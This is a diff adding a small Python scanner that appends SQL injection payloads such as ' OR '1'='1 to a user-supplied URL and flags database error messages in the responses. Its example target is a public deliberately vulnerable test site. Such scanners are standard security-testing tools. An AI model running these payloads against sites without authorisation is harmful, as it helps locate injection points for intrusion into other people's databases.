@@ -1,0 +1,19 @@
+import requests
+
+url = input("Enter URL (example: http://testphp.vulnweb.com/listproducts.php?cat=1): ")
+
+payloads = ["'", "' OR '1'='1", "' OR \"1\"=\"1'"]
+
+print("\nScanning for SQL Injection...\n")
+
+for payload in payloads:
+    target = url + payload
+    
+    response = requests.get(target)
+    
+    errors = ["SQL syntax", "mysql_fetch", "ORA-01756", "syntax error"]
+    
+    for error in errors:
+        if error.lower() in response.text.lower():
+            print(f"[+] SQL Injection Vulnerability Found with payload: {payload}")
+            break
